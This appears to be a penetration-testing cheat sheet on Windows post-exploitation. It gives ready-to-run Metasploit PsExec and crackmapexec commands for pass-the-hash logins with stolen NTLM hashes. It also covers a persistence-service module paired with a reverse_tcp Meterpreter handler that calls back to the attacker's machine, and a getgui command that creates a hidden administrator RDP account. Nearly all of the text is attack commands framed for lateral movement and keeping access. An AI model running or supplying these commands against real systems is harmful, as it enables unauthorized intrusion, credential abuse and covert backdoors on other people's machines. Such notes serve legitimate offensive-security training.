# Pass the Hash Attacks

Obtaining and using the administrator's NTLM hash allows persistent access to the target system through a technique called **pass-the-hash (PTH)** - enabling authentication without the plaintext password. This underscores the critical need for strong credential management and highlights risks tied to weak or reused passwords.

**PsExec**
The PsExec module in Metasploit (`exploit/windows/smb/psexec`) is used to execute commands on a remote Windows machine over **SMB** (Server Message Block). This module is particularly useful for lateral movement and privilege escalation in post-exploitation scenarios.

```shell
use exploit/windows/smb/psexec
show options
set LPORT <port_number>
set RHOSTS <target_IP>
set SMBUser Administrator # Use the Administrator account for SMB authentication
set SMBPass <LM:NTLM>  # Provide the LM and NTLM hash (in LM:NTLM format)
exploit
```

Even if you already have administrative access on one machine through a Meterpreter session, using PsExec allows you to:
- **Establish Persistent Access:** If your original exploit gets patched or the vulnerability is fixed, using PsExec with valid credentials (or hashes) lets you regain access without exploiting the vulnerability again.
- **Lateral Movement Across the Network:** You can use stolen credentials (or NTLM hashes) to move from one compromised machine to other systems within the network that share the same credentials.
- **Privilege Escalation:** If you don't have the highest privileges on a new target system, PsExec can help you gain full administrative access using known valid credentials.

**Crackmapexec**

```shell
# Another way is using crackmapexec
crackmapexec smb <target IP> -u Administrator -H "<NTLM hash>"
crackmapexec smb <target IP> -u Administrator -H "<NTLM hash>" -x "ipconfig"
crackmapexec smb <target IP> -u Administrator -H "<NTLM hash>" -x "whoami"
```

<br>

# Persistence Service - Metasploit Modules

```shell
use exploit/windows/local/persistence_service
show options
set SESSION 1
exploit
# By default the module uses the following payload: windows/meterpreter/reverse_tcp

# Start another msfconsole and run multi handler to re-gain access
use exploit/multi/handler
set LHOST <Kali_IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT <port_number>
exploit

# Switch back to the active meterpreter session and reboot the machine
session -i 1
reboot
# Once the machine reboots we would expect a new meterpreter session without re-exploitation. This happened because we have added a malicious executable for maintaining access
```

<br>

# Maintaining Access: RDP

We will be creating a user and adding that user to the Administrators group. All this can be done using the `getgui` meterpreter command.

The `getgui` command makes the below changes to the target machine:
- Enable RDP service if it’s disabled
- Creates new user for an attacker
- Hide user from Windows Login screen
- Adding created user to "Remote Desktop Users" and "Administrators" groups

```shell
run getgui -e -u alice -p hack_123321
# run getgui > Runs the getgui Meterpreter script — short for “get GUI (Graphical User Interface)”
# -e > Enables Remote Desktop (RDP) service on the target
# -u alice > Creates a new user named alice
# -p hack_123321 > Sets the password for the alice user to hack_123321
```
